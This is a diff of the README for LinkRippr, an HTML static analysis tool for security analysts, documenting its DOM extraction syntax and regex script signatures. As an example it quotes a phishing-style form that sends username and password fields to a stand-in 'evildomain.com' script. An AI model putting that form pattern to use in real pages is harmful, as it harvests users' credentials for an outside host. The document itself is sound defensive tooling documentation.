@@ -15,21 +15,35 @@ sjb-ch1mp
 
 Description:
 
-LinkRippr is a static analysis tool for HTML documents for infosec professionals. LinkRippr
-extracts elements from the DOM and prints a formatted summary for the user to quickly assess
-the contents of the document in which they are interested.
+LinkRippr is a static analysis tool for HTML documents for infosec professionals. It has two main
+features:
 
-By default, LinkRippr will:
- 1. Extract any hyperlinks (<a> elements),
- 2. Will check if a <base> element is being utilised (this can obfuscate URLs from some tools),
- 3. Extract any forms, along with their 'method' and 'action' attributes,
- 4. Extract all input associated with each form,
- 5. Extract the source attribute for any scripts.
+    1. Extracting elements and attributes of interest from HTML.
+    2. Detecting signatures of interest in JavaScript blocks.
 
-In addition to LinkRippr's default behaviour, the user can identify any elements of interest in
-the 'Extractions' pane.
+DOM Extractions:
 
-Planned Functionality:
+Element and attribute extractions can be defined in the 'DOM Extractions' panel by typing the element
+name in the TAG column and any attributes of interest in the ATTRIBUTES column. If you wish to extract
+all attributes when LinkRippr finds a named element, you can use '*' in the ATTRIBUTES column.
 
-- Deobfuscation of common simple JavaScript obfuscation techniques.
-- Export report to CSV file.
+LinkRippr can also extract 'nested' elements, for example, <input> elements inside a <form> element such as:
+
+    <form method="POST" action="http://evildomain.com/badscript.php">
+        <input type="text" name="username">
+        <input type="text" name="password">
+    </form>
+
+In such a case, you can use LinkRippr's simple syntax to define 'nested' element extractions in the DOM Extraction
+panel. To extract the 'nested' <input> elements from the <form> element above, you would type:
+
+    "method,action,[input:type,name]"
+
+This would extract the "method" and "action" attributes for any <form> element found, AS WELL AS any <input>
+elements within that <form> and the "type" and "name" attributes for the nested <input> elements.
+
+Script Signatures:
+
+Signatures are defined using regular expressions. LinkRippr splits script blocks into clean statements and then
+searches each statement for matches against each signature defined in the Script Signatures panel. If found, the
+matching text will be extracted from the script block and added to the summary output.
